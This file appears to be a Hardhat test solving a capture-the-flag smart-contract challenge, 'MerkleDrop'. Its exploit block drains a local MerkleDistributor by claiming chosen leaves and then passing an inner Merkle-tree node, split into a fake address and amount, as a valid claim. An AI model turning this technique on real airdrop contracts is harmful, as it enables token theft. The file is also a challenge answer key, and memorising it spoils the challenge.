import {ethers} from 'hardhat';
import {expect} from 'chai';
import {findNode, getResult } from './helper';
import { BigNumber } from 'ethers';
import {merkleRoot, tokenTotal, claims} from  '../../contracts/merkledrop/tree.json';


describe('[Challenge] MerkleDrop', function () {

    let deployer, attacker;

    before(async function () {
        /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
        [deployer, attacker] = await ethers.getSigners();

        const SetupFactory = await ethers.getContractFactory('SetupMerkleDrop', deployer);
        this.challenge = await SetupFactory.deploy();

        expect(
            await this.challenge.isSolved()
        ).to.equal(false);
    });

    it('Exploit', async function () {
         /** CODE YOUR EXPLOIT HERE */
        let node = await findNode();
        let results = getResult();
        results = results.map(x => x.toHexString())

        
        const merkleDisbutorAddress = await this.challenge.merkleDistributor();
        const MerkleDistributorFactory = await ethers.getContractFactory('MerkleDistributor', attacker);
        const MerkleDistributor = MerkleDistributorFactory.attach(merkleDisbutorAddress);

        for (let p in results){
            for (let leaf in claims) {
                let leafData = claims[leaf];
                if (leafData['amount'] === results[p]){
                    await MerkleDistributor.claim(leafData['index'], leaf, leafData['amount'], leafData['proof']);
                }
            }
        }
        
        //console.log(node[0].substr(0,42), node[0].substr(42));
        await MerkleDistributor.claim("0xd43194becc149ad7bf6db88a0ae8a6622e369b3367ba2cc97ba1ea28c407c442", node[0].substr(0,42), '0x'+ node[0].substr(42),  [
            "0x8920c10a5317ecff2d0de2150d5d18f01cb53a377f4c29a9656785a22a680d1d",
            "0xc999b0a9763c737361256ccc81801b6f759e725e115e4a10aa07e63d27033fde",
            "0x842f0da95edb7b8dca299f71c33d4e4ecbb37c2301220f6e17eef76c5f386813",
            "0x0e3089bffdef8d325761bd4711d7c59b18553f14d84116aecb9098bba3c0a20c",
            "0x5271d2d8f9a3cc8d6fd02bfb11720e1c518a3bb08e7110d6bf7558764a8da1c5"
        ]);
    });

    after(async function () {
        /** SUCCESS CONDITIONS */

        expect(
            await this.challenge.isSolved()
        ).to.equal(true);
        
    });
});